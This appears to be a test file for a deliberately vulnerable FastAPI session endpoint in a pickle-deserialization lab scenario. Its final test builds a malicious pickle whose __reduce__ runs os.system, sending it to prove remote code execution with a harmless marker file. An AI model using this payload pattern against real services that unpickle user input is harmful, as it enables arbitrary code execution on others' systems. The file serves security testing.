"""Tests for S02 pickle deserialization scenario.

Uses in-process ASGI transport so tests don't need a running uvicorn.
"""

import base64
import os
import pickle

from fastapi.testclient import TestClient

from main import app, MARKER

client = TestClient(app)


def test_health():
    r = client.get("/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_session_normal():
    session_data = {"user": "alice", "role": "admin"}
    blob = base64.b64encode(pickle.dumps(session_data)).decode()
    r = client.post("/session", content=blob)
    assert r.status_code == 200
    data = r.json()
    assert data["session"]["user"] == "alice"


def test_session_empty():
    r = client.post("/session", content="")
    assert r.status_code == 200
    assert "error" in r.json()


def test_session_invalid_base64():
    r = client.post("/session", content="not-valid-base64!!!")
    assert r.status_code == 200
    assert "error" in r.json()


def test_pickle_exec_proves_rce():
    """Craft a pickle that writes a marker file — proves code execution."""
    class RCE:
        def __reduce__(self):
            return (os.system, (f'echo "pickle_rce" > {MARKER}',))

    blob = base64.b64encode(pickle.dumps(RCE())).decode()
    r = client.post("/session", content=blob)
    assert r.status_code == 200
    assert os.path.exists(MARKER)
    os.remove(MARKER)
